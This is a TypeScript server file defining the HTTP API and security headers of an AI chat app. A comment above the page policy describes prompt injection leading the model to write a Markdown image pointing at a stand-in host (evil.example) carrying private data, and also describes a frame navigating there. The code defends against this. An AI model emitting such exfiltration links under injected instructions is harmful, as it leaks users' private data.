import { join } from "node:path";
import { serveStatic } from "@hono/node-server/serve-static";
import { type Context, Hono } from "hono";
import { bodyLimit } from "hono/body-limit";
import { compress } from "hono/compress";
import { etag } from "hono/etag";
import type { hc } from "hono/client";
import { HTTPException } from "hono/http-exception";
import { createUIMessageStreamResponse, type UIMessage } from "ai";
import * as Effect from "effect/Effect";
import * as Option from "effect/Option";
import { z } from "zod";
import { ARTIFACT_CDNS } from "../shared/cdns.ts";
import { adminApi } from "./admin/routes.ts";
import { connectorsApi, oauthCallback } from "./mcp/routes.ts";
import type { SignedInEnv } from "./auth.ts";
import * as Auth from "./auth/Auth.ts";
import { bootPage, meOf, skillOptions } from "./boot-page.ts";
import * as Credits from "./credits/Credits.ts";
import * as Files from "./files.ts";
import { MAX_FILE_BYTES, refusalText } from "./files.ts";
import * as Memory from "./memory.ts";
import { memoryApi } from "./memory/routes.ts";
import * as Models from "./models/Models.ts";
import type { LimitName } from "./limits/RateLimits.ts";
import { limitPerPerson } from "./rate-limit.ts";
import * as Sandbox from "./python/pyodide.ts";
import { searchThreads } from "./thread-search.ts";
import * as Database from "./runtime/Database.ts";
import { route } from "./runtime/route.ts";
import { threadResponse } from "./thread-cache.ts";
import * as Threads from "./threads/Threads.ts";
import * as Runs from "./telemetry/Runs.ts";
import { validate } from "./validate.ts";
import { WEB_BUILD } from "./web-build.ts";
import * as Replies from "./workflow/replies.ts";

/**
 * The HTTP API, served by Nitro (nitro.config.ts), which also compiles the chat workflow
 * ("use workflow", "use step") and serves the workflow's internal flow route. Start-up
 * work (migrations, the Postgres World's worker) is in server/plugins/startup.ts.
 */
type Env = SignedInEnv;
const app = new Hono<Env>();

/**
 * What the app's pages may load. A reply is Markdown, and a Markdown image loads by
 * itself as soon as the reply shows: text that a page or an email put in front of the
 * model could make it write ![](https://evil.example/?d=<something private>), and the
 * browser would send the data out with nobody clicking. So images and media load only
 * from this server, data and blob URLs, and the CDNs an HTML artifact may use (its frame
 * is held to this policy too). Scripts, styles and fetch are left as they are.
 *
 * No frame may load an address. An HTML artifact runs script in its frame, and could
 * send the frame itself to https://evil.example/?d=<something private>. Its own policy
 * (web/artifacts/html.ts) cannot stop that, but this one can: a browser checks where a
 * frame goes against the page that holds it. Every frame in the app is a srcdoc frame,
 * which loads no address, so they all still show.
 */
const PAGE_POLICY = [
	`img-src 'self' data: blob: ${ARTIFACT_CDNS.join(" ")}`,
	"media-src 'self' data: blob:",
	"object-src 'none'",
	"frame-src 'none'",
	"form-action 'self'",
	"base-uri 'self'",
].join("; ");

// The API's files set their own policy (/api/files/:id), and JSON needs none.
app.use("*", async (c, next) => {
	await next();
	if (!c.req.path.startsWith("/api/") && !c.res.headers.has("Content-Security-Policy")) c.res.headers.set("Content-Security-Policy", PAGE_POLICY);
});

// For the uptime checks: the server answers and its database does, within 3 seconds. 503 otherwise.
// The reference for a thin route (docs/effect.md): one effect, its failures mapped to answers.
const databaseUnavailable = (_: unknown, c: Context) => c.text("database unavailable", 503);
app.get("/health", (c) =>
	route(c, Database.pingWithin("3 seconds").pipe(Effect.map(() => c.text("ok"))), {
		SqlError: databaseUnavailable,
		TimeoutError: databaseUnavailable,
	}),
);

// The end of a connector's OAuth sign-in (mcp/routes.ts). It reads the session itself.
app.get("/oauth/mcp/callback", oauthCallback);

// Sign-in (auth.ts): magic links, sessions. Every other /api route needs a signed-in person.
app.on(["GET", "POST"], "/api/auth/*", (c) => route(c, Auth.Auth.use((auth) => auth.handler(c.req.raw))));
app.use("/api/*", async (c, next) => {
	const session = await route(c, Auth.Auth.use((auth) => auth.session(c.req.raw.headers)));
	if (Option.isNone(session)) return c.json({ error: "Sign in first." }, 401);
	c.set("user", session.value.user);
	await next();
});
const userOf = (c: Context<Env>) => c.get("user").id;
/** At most so many uses per person (rate-limit.ts). */
const perPerson = (limit: LimitName, options?: { plain?: boolean }) => limitPerPerson(limit, (c: Context<Env>) => userOf(c), options);

// A repeated or odd query value is ignored, not refused.
const searchQuery = z.object({ q: z.string().default("").catch("").transform((q) => q.slice(0, 200)) });
const threadTitle = z.object({ title: z.string().optional().transform((title) => (title ?? "").slice(0, 120)) });
// The messages are the AI SDK's UIMessages, which the workflow reads; only the shape is checked here.
const chatBody = z.object({ id: z.string(), messages: z.array(z.custom<UIMessage>()).min(1), model: z.string().optional() });
const streamQuery = z.object({ startIndex: z.coerce.number().int().min(0).max(Number.MAX_SAFE_INTEGER).default(0).catch(0) });
const memoryQuery = z.object({ wait: z.string().optional().catch(undefined) });
const usageQuery = z.object({ thread: z.string().optional().catch(undefined) });

// Files attached in the chat. Each person sees only their own.
const uploadLimit = bodyLimit({
	maxSize: MAX_FILE_BYTES + 64 * 1024,
	onError: (c) => c.json({ error: "That file is larger than 10 MB." }, 413),
});

/**
 * The API that the web app calls. The routes are chained so that Hono can infer their
 * paths, inputs and answers: AppType below, for the typed client in web/api.ts.
 */
const api = app
	// Who is signed in, their role (read from the database, not the cookie), and their credits for today.
	.get("/api/me", (c) => route(c, Effect.map(meOf(c.get("user")), (me) => c.json(me))))

	// The admin pages' API (admin/routes.ts). Every route there needs the admin role.
	.route("/api/admin", adminApi)

	// Connectors: the MCP servers each person connected (server/mcp/).
	.route("/api/connectors", connectorsApi)

	// Whether the chat can run Python, for the attach button.
	.get("/api/features", (c) => route(c, Effect.map(Sandbox.Sandbox.use((sandbox) => sandbox.ready), (python) => c.json({ python }))))

	// The models a person can pick (only those with Zero Data Retention), and the one picked when they have not chosen.
	.get("/api/models", (c) =>
		route(
			c,
			Effect.map(
				Models.Models.use((models) => models.available),
				(available) => c.json(available),
			),
		),
	)

	// The skills that are on, for the $ menu: names and descriptions, not the instructions.
	.get("/api/skills", (c) => route(c, Effect.map(skillOptions, (skills) => c.json({ skills }))))

	.get("/api/credits", (c) => route(c, Effect.map(Credits.Credits.use((credits) => credits.status(userOf(c))), (status) => c.json(status))))

	// Out of credits: ask the admins for more (credits/ExtraCredits.ts). One request waits at a time.
	.post("/api/credits/request", perPerson("creditRequest"), (c) =>
		route(
			c,
			Effect.flatMap(Auth.appOrigin(c.req.raw.headers), (origin) =>
				Effect.map(Credits.Credits.use((credits) => credits.request(c.get("user"), origin)), (status) => c.json(status)),
			),
			{
				AlreadyAsked: (error, c) => c.json({ error: error.message }, 409),
				CreditsLeft: (error, c) => c.json({ error: error.message }, 400),
			},
		),
	)

	// The list revalidates by its content and goes gzipped; one thread has its own cache (thread-cache.ts).
	.get("/api/threads", compress(), etag(), (c) =>
		route(
			c,
			Effect.map(
				Threads.Threads.use((threads) => threads.list(userOf(c))),
				(threads) => c.json({ threads }),
			),
		),
	)

	// Search in the person's chats (thread-search.ts). Before /api/threads/:id, which would take "search" as an id.
	.get("/api/threads/search", perPerson("search"), validate("query", searchQuery), (c) =>
		route(
			c,
			Effect.map(searchThreads(userOf(c), c.req.valid("query").q), (threads) => c.json({ threads })),
		),
	)

	.patch("/api/threads/:id", validate("json", threadTitle), (c) =>
		route(
			c,
			Effect.map(
				Threads.Threads.use((threads) => threads.rename(c.req.param("id"), userOf(c), c.req.valid("json").title)),
				(renamed) => (renamed ? c.json({ ok: true }) : c.json({ error: "Not found" }, 404)),
			),
		),
	)

	// A reply still running stops first (workflow/replies.ts).
	.delete("/api/threads/:id", (c) =>
		route(
			c,
			Effect.map(
				Replies.Replies.use((replies) => replies.remove(c.req.param("id"), userOf(c))),
				(deleted) => (deleted ? c.json({ ok: true }) : c.json({ error: "Not found" }, 404)),
			),
		),
	)

	.get("/api/threads/:id", (c) => route(c, threadResponse(c, c.req.param("id"), userOf(c))))

	// A run with no messages fails before it writes, and its stream would never close, so chatBody refuses it.
	// The chat transport shows the response text as the error, so its errors are plain text.
	// The chat routes answer a stream, so their type is Response, as it always was: the chat transport reads them.
	.post("/api/chat", perPerson("chat", { plain: true }), validate("json", chatBody, { error: "Nothing to send.", plain: true }), (c): Promise<Response> => {
		const body = c.req.valid("json");
		return route(
			c,
			Effect.map(
				Replies.Replies.use((replies) => replies.start({ threadId: body.id, owner: userOf(c), messages: body.messages, model: body.model })),
				(reply) => createUIMessageStreamResponse({ stream: reply.stream, headers: { "x-workflow-run-id": reply.runId } }),
			),
			{
				OutOfCredits: (error, c) => c.text(error.message, 402),
				ThreadNotYours: (_, c) => c.json({ error: "Not found" }, 404),
			},
		);
	})

	// A reply, from its start or from `startIndex` (the UI chunks the page already has).
	// :id is the thread (a reloaded page) or the run (WorkflowChatTransport after a dropped
	// connection). 204 when the thread has no run.
	.get("/api/chat/:id/stream", validate("query", streamQuery), (c): Promise<Response> =>
		route(
			c,
			Effect.map(
				Replies.Replies.use((replies) => replies.follow(c.req.param("id"), userOf(c), c.req.valid("query").startIndex)),
				Option.match({
					onNone: () => c.body(null, 204),
					onSome: (reply) => createUIMessageStreamResponse({ stream: reply.stream, headers: { "x-workflow-run-id": reply.runId } }),
				}),
			),
		),
	)

	// Stop: closing the request does not end a run; this does.
	.post("/api/chat/:id/stop", (c) =>
		route(
			c,
			Effect.map(
				Replies.Replies.use((replies) => replies.stop(c.req.param("id"), userOf(c))),
				(stopped) => c.json({ stopped }),
			),
		),
	)

	// Memory (server/memory/routes.ts): what Ponder remembers about the person, and the decisions behind it.
	.route("/api/memory", memoryApi)

	// A chat's memory decisions. With ?wait=1, first waits for the reply to be saved and its memory save to end.
	.get("/api/threads/:id/memory", validate("query", memoryQuery), (c) => {
		const threadId = c.req.param("id");
		const wait = Boolean(c.req.valid("query").wait);
		const saved = wait ? Replies.Replies.use((replies) => replies.whenFinished(threadId)) : Effect.void;
		return route(
			c,
			saved.pipe(
				Effect.andThen(Memory.Memory.use((memory) => memory.threadSaves(userOf(c), threadId, { settle: wait }))),
				Effect.map((saves) => c.json({ saves })),
			),
		);
	})

	// The upload is a form, read by the route: a form validator would read the body
	// itself and turn "too large" (uploadLimit) into a 400.
	.post("/api/files", perPerson("upload"), uploadLimit, async (c) => {
		const form = await c.req.formData();
		const file = form.get("file");
		if (!(file instanceof File)) return c.json({ error: "No file in the upload." }, 400);
		return route(
			c,
			Effect.map(
				Files.Files.use((files) => files.save(userOf(c), file)),
				(stored) => c.json(stored),
			),
			{ FileRefused: (refused, c) => c.json({ error: refusalText(file.name, refused) }, 400) },
		);
	})

	.get("/api/files/:id", (c) =>
		route(
			c,
			Effect.map(
				Files.Files.use((files) => files.load(c.req.param("id"), userOf(c))),
				Option.match({
					onNone: () => c.json({ error: "Not found" }, 404),
					onSome: (file) => {
						// Only types that cannot run script open in the browser. Anything else (HTML or SVG that Python wrote) downloads, sandboxed.
						const inline = INLINE_TYPES.has(file.media_type);
						return c.body(new Uint8Array(file.data), 200, {
							"Content-Type": file.media_type,
							"Content-Disposition": `${inline ? "inline" : "attachment"}; filename*=UTF-8''${encodeURIComponent(file.name)}`,
							"Cache-Control": "private, max-age=31536000, immutable",
							"X-Content-Type-Options": "nosniff",
							...(!inline && { "Content-Security-Policy": "default-src 'none'; sandbox" }),
						});
					},
				}),
			),
		),
	)

	// Tokens and cost of a person's runs, optionally for one thread.
	.get("/api/usage", validate("query", usageQuery), (c) =>
		route(
			c,
			Effect.map(
				Runs.Runs.use((runs) => runs.usageReport({ user: userOf(c), thread: c.req.valid("query").thread })),
				(report) => c.json(report),
			),
		),
	);

/** The API's routes, for the typed client (web/api.ts). Import it as a type only, so no server code reaches the browser. */
export type AppType = typeof api;
/** The typed client itself. web/api.ts declares its client with it, so a check without the server can replace it (web/server-stub.d.ts). */
export type ApiClient = ReturnType<typeof hc<AppType>>;

// The admin pages are their own app (web/admin.html) with its own routes under /admin/.
const adminPage = serveStatic({ path: join(WEB_BUILD, "admin.html") });
app.get("/admin", adminPage);
app.get("/admin/*", adminPage);

// The chat page, with the data its first screen needs (boot-page.ts).
app.get("/", bootPage);

// Vite names each file in assets/ by its content, so a browser may keep it for good: a new
// build has new names. Without this, Cloudflare told browsers to keep them 4 hours, after
// which each visit asked again for every file.
app.use("/assets/*", async (c, next) => {
	await next();
	if (c.res.status === 200) c.res.headers.set("Cache-Control", "public, max-age=31536000, immutable");
});
// The build keeps brotli and gzip copies of its text files, at the highest levels (scripts/compress-web.ts).
app.use("/*", serveStatic({ root: WEB_BUILD, precompressed: true }));

// An unknown API address answers in the API's shape. Any other is Hono's own 404, as before.
app.notFound((c) => (c.req.path.startsWith("/api/") ? c.json({ error: "Not found" }, 404) : c.text("404 Not Found", 404)));

// The sub-apps (admin, connectors, memory) have no handler of their own, so their errors end here too.
app.onError((error, c) => {
	// A refusal that a route or middleware threw carries its own answer.
	if (error instanceof HTTPException) return error.getResponse();
	// The console, as Effect's logger writes it: Hono calls this without waiting, and the
	// error may be the runtime's own, such as one that could not be built.
	console.error(`request failed: ${c.req.method} ${c.req.path}:`, error);
	const message = "Something went wrong. Try again.";
	if (isChat(c.req.path)) return c.text(message, 500);
	return c.req.path.startsWith("/api/") ? c.json({ error: message }, 500) : c.text("Internal Server Error", 500);
});

export default app;

/** The chat routes answer in plain text: the chat transport shows the response text as the error. */
function isChat(path: string) {
	return path === "/api/chat" || path.startsWith("/api/chat/");
}

const INLINE_TYPES = new Set(["image/png", "image/jpeg", "image/gif", "image/webp", "application/pdf", "text/plain", "text/csv", "text/tab-separated-values", "text/markdown", "application/json"]);
